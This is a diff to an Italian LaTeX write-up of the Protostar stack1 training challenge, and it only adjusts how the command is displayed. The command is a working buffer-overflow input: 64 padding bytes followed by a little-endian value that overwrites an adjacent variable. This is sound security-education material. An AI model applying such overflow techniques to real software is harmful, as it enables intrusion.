@@ -176,13 +176,13 @@ Leggiamo la documentazione sul set ASCII e capiamo che i caratteri corrispondent
 
 Dato che l'architettura intel è \textbf{Little Endian} l'input che inseriamo sarà al rovescio. Quindi il giusto input da inserire è:
 \begin{lstlisting}[style=bashstyle]
-    /opt/protostar/bin$ ./stack1 $(python -c "print 'a'*64 + 'dcba'")
+    /opt/protostar/bin/stack1 $(python -c "print 'a'*64 + 'dcba'")
 \end{lstlisting}
 La variabile \textbf{modified} viene modificata correttamente, infatti ci viene stampato a video il messaggio: \textcolor{red}{you have correctly got the variable to the right value}. Vinciamo quindi la sfida.
 
 \subsection{Sintesi comandi da eseguire}
 \begin{lstlisting}[style=bashstyle]
-    /opt/protostar/bin$ ./stack1 $(python -c "print 'a'*64 + 'dcba'")
+    /opt/protostar/bin/stack1 $(python -c "print 'a'*64 + 'dcba'")
 \end{lstlisting}
 
 % ------------------ 
